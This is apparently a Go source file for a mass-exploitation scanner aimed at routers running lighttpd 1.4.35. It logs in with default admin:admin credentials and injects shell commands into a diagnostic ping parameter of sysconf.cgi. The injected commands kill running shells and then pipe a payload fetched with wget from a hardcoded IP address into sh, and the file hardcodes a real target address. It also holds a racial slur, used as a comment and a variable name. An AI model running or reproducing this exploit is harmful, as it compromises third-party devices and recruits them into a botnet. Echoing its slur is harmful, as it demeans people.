package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	ExecutionMessage string
	Port             string
	TlsSupport       bool

	conf = &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS10,
	}

	tlsDialer = &net.Dialer{Timeout: Timeout}

	UserAgent   = "Hello World/1.0"
	Credentials = []string{"admin:admin"}
	Payload     = "wget%20http://185.150.26.225/asd%20-O-%20|%20sh"

	WG sync.WaitGroup

	Timeout   = 120 * time.Second
	StartTime = time.Now()

	Processed uint64
	Found     uint64
	Logins    uint64
	Exploited uint64
)

// DialTimeout is a simple dial with tls support
func DialTimeout(target string, timeout time.Duration) (net.Conn, error) {
	if TlsSupport {
		tlsDialer.Timeout = timeout
		return tls.DialWithDialer(tlsDialer, "tcp", target, conf)
	}

	return net.DialTimeout("tcp", target, timeout)
}

// ReadUntil is a simple read method that reads until a specific prompt, mostly used for telnet shells
func ReadUntil(conn net.Conn, prompt string) bool {
	var started = time.Now()

	for {
		if time.Now().After(started.Add(1 * time.Minute)) {
			return false
		}
		buff := make([]byte, 1024)

		// this should in theory never error but ye.
		err := conn.SetDeadline(time.Now().Add(Timeout))
		if err != nil {
			return false
		}

		// this should in theory only error when no connection is there... but yea..
		_, err = conn.Read(buff)
		if err != nil {
			return false
		}

		// nigger
		if strings.Contains(string(buff), prompt) {
			return true
		}
	}
}

// Verify verifies the device (checks if it contains the right headers, mostly used to avoid a few honeypots)
func Verify(target string, identifier ...string) error {
	conn, err := DialTimeout(target, Timeout)
	if err != nil {
		return err
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + UserAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	if _, err = io.Copy(&buff, conn); err != nil {
		return err
	}

	for _, s := range identifier {
		if !strings.Contains(buff.String(), s) {
			return errors.New("no identifier")
		}
	}

	return nil
}

func StopPing(target string, combo string, lol time.Time) error {
	conn, err := DialTimeout(target, Timeout)
	if err != nil {
		return err
	}

	defer conn.Close()

	var link = "GET /cgi-bin/sysconf.cgi?page=ajax.asp&action=diagnostic_tools_stop&notrun=1&time=" + strconv.Itoa(int(lol.Unix())) + "&_=" + strconv.Itoa(int(lol.Unix())) + " HTTP/1.1"
	conn.Write([]byte(link + "\r\n" +
		"Host: " + target + "\r\n" +
		"User-Agent: " + UserAgent + "\r\n" +
		"Sid: " + combo + "\r\n" +
		"Cookie: sid=" + combo + "; userlevel=0; page=monitor_diagnostic_tools.asp,monitor,2,undefined\r\n" +
		"\r\n"))

	var buff bytes.Buffer
	if _, err = io.Copy(&buff, conn); err != nil {
		return err
	}

	return nil
}

func StartPing(target string, combo string, lol time.Time) error {
	conn, err := DialTimeout(target, Timeout)
	if err != nil {
		return err
	}

	defer conn.Close()

	var link = "GET /cgi-bin/sysconf.cgi?page=ajax.asp&action=diagnostic_tools_start&notrun=1&time=" + strconv.Itoa(int(lol.Unix())) + "&_=" + strconv.Itoa(int(lol.Unix())) + " HTTP/1.1"
	conn.Write([]byte(link + "\r\n" +
		"Host: " + target + "\r\n" +
		"User-Agent: " + UserAgent + "\r\n" +
		"Sid: " + combo + "\r\n" +
		"Cookie: sid=" + combo + "; userlevel=0; page=monitor_diagnostic_tools.asp,monitor,2,undefined\r\n" +
		"\r\n"))

	var buff bytes.Buffer
	if _, err = io.Copy(&buff, conn); err != nil {
		return err
	}

	if !strings.Contains(buff.String(), ExecutionMessage) {
		return errors.New("failed :(")
	}

	return nil
}

func SetPing(target string, combo string, lol time.Time, command string) error {
	conn, err := DialTimeout(target, Timeout)
	if err != nil {
		return err
	}

	defer conn.Close()

	conn.Write([]byte("GET /cgi-bin/sysconf.cgi?page=ajax.asp&action=save_monitor_diagnostic&mon_diag_type=0&mon_diag_addr=$(" + strings.ReplaceAll(command, " ", "%20") + ")&mon_ping_num=4&mon_ping_size=56&mon_ping_timeout=10&mon_tracert_hops=&mon_diag_protocol_type=4&time=" + strconv.Itoa(int(lol.Unix())) + "&_=" + strconv.Itoa(int(lol.Unix())) + " HTTP/1.1\r\n" +
		"Host: " + target + "\r\n" +
		"User-Agent: " + UserAgent + "\r\n" +
		"Sid: " + combo + "\r\n" +
		"Cookie: sid=" + combo + "; userlevel=0; page=monitor_diagnostic_tools.asp,monitor,2,undefined\r\n" +
		"\r\n\r\n"))

	var buff bytes.Buffer
	if _, err = io.Copy(&buff, conn); err != nil {
		return err
	}

	if !strings.Contains(buff.String(), "Successfully") {
		return errors.New("failed :(")
	}

	return nil
}

func Login(target string, combo string) (string, error) {
	conn, err := DialTimeout(target, Timeout)
	if err != nil {
		return "", err
	}

	defer conn.Close()

	body := "user_name=admin&user_passwd=admin"
	request := "POST /cgi-bin/sysconf.cgi?page=login.asp&action=login HTTP/1.1\r\n" +
		"Host: " + target + "\r\n" +
		"User-Agent: " + UserAgent + "\r\n" +
		"Content-Length: " + strconv.Itoa(len(body)) + "\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\n" +
		"\r\n" + body

	conn.Write([]byte(request))

	var buff bytes.Buffer
	if _, err = io.Copy(&buff, conn); err != nil {
		return "", err
	}

	if !strings.Contains(buff.String(), "200 OK") || !strings.Contains(buff.String(), "Set-Cookie") {
		return "", errors.New("unauthorized")
	}

	r, err := regexp.Compile("sid=([^;]+)")
	if err != nil {
		return "", err
	}

	return strings.Split(r.FindString(buff.String()), "=")[1], nil
}

func Process(target string) {
	Processed++

	WG.Add(1)
	defer WG.Done()

	err := Verify(target, "Server: lighttpd/1.4.35")
	if err != nil {
		return
	}

	Found++

	sid, err := Login(target, "admin:admin")
	if err != nil {
		return
	}

	fmt.Printf("[NTEL] Logged in: %s {Combo: %s, Sid: %s}\r\n", target, "admin:admin", sid)
	Logins++

	nigger := time.Now()

	StopPing(target, sid, nigger)
	SetPing(target, sid, nigger, `killall -9 /bin/sh ; killall -9 /z/bin ; killall -9 /bin/bash`)
	StartPing(target, sid, nigger)

	err = StopPing(target, sid, nigger)
	if err != nil {
		return
	}

	err = SetPing(target, sid, nigger, "wget http://185.150.26.225/asd -O- | sh")
	if err != nil {
		return
	}

	err = StartPing(target, sid, nigger)
	fmt.Printf("[NTEL] Inf: %s {Combo: %s, Sid: %s}\r\n", target, "admin:admin", sid)

	Exploited++
}

func titleWriter() {
	for {
		fmt.Printf("%.0fs -> Processed: %d -> Verified: %d -> Successful Logins: %d -> Executed: %d -> Routines: %d\n", time.Since(StartTime).Seconds(), Processed, Found, Logins, Exploited, runtime.NumGoroutine())
		time.Sleep(1 * time.Second)
	}
}

func main() {
	var Separator string

	flag.StringVar(&Port, "port", "listen", "Device port")
	flag.StringVar(&Separator, "separator", ",", "Separator for XMAP (Advanced version of ZMAP with multiple port support)")
	flag.StringVar(&ExecutionMessage, "execmsg", "listening dn0", "Execution message")
	flag.BoolVar(&TlsSupport, "tls", true, "Tls dialer")
	flag.Parse()

	go titleWriter()

	go Process("197.188.67.73:8080")

	reader := bufio.NewReader(os.Stdin)
	input := bufio.NewScanner(reader)

	for input.Scan() {
		if Port == "listen" {
			go Process(strings.ReplaceAll(input.Text(), Separator, ":"))
		} else {
			go Process(input.Text() + ":" + Port)
		}
	}

	time.Sleep(10 * time.Second)
	WG.Wait()
}
